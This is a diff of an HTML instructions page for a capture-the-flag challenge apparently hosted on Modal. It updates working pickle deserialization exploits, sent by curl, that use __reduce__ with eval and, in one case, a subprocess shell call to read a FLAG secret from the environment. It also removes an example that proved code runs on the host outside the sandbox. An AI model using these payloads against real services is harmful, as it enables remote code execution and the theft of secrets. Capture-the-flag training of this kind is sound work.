@@ -23,37 +23,31 @@
 
     <div class="section">
         <h2>Example: Simple Code Execution</h2>
-        <p>Try running a simple Python script to verify the code is executing remotely in Modal:</p>
+        <p>Try running simple Python code to verify it's executing remotely in Modal:</p>
         <div class="code-block">curl -X POST [YOUR_URL]/execute --data-binary @- &lt;&lt;'EOF'
-f"2+2={2+2}"
+# Outputs gvisor when running in the sandbox
+import os
+f"MODAL_FUNCTION_RUNTIME: {os.environ.get('MODAL_FUNCTION_RUNTIME', 'not set')}"
 EOF</div>
     </div>
 
     <div class="section">
         <h2>Example: Pickle Deserialization Attack</h2>
         <p>Here's how to exploit pickle deserialization to capture the flag:</p>
+        <p><strong>Example 1:</strong></p>
         <div class="code-block">curl -X POST [YOUR_URL]/execute --data-binary @- &lt;&lt;'EOF'
 class FlagExploit:
     def __reduce__(self):
         import os
-        return (eval, ("__import__('os').environ.get('FLAG', 'No flag found')",))
+        return (eval, ("f\"The flag is: {__import__('os').environ.get('FLAG', 'No flag')}\"",))
 
 FlagExploit()
 EOF</div>
-        <p>The server will return pretty-printed JSON with the flag in the "result" field.</p>
-    </div>
-
-    <div class="section">
-        <h2>Example: Host Username Verification</h2>
-        <p>This exploit will show the $USER environment variable from the host system (should show 'ctfuser' on the Docker host, proving the exploit runs outside Modal):</p>
+        <p><strong>Example 2:</strong></p>
         <div class="code-block">curl -X POST [YOUR_URL]/execute --data-binary @- &lt;&lt;'EOF'
-class UserExploit:
-    def __reduce__(self):
-        import os
-        return (eval, ("__import__('os').environ.get('USER', 'unknown')",))
-
-UserExploit()
+type('E', (), {'__reduce__': lambda s: (eval, ("__import__('subprocess').check_output(['sh', '-c', 'echo -n \"The flag is: $FLAG\"']).decode()",))})()
 EOF</div>
+        <p>The server will return pretty-printed JSON with the flag in the "result" field.</p>
     </div>
 
     <div class="section">
@@ -72,7 +66,7 @@ EOF</div>
         <p>Request body: Raw Python code (plain text, not JSON)</p>
         <p>Response: Pretty-printed JSON with execution results</p>
         <p>Important: Use <code>--data-binary</code> to preserve newlines in multiline code</p>
-        <div class="code-block">curl -X POST [YOUR_URL]/execute --data-binary 'print("Hello"); 42'</div>
+        <div class="code-block">curl -X POST [YOUR_URL]/execute --data-binary 'print("Hello")'</div>
     </div>
 </body>
 </html>
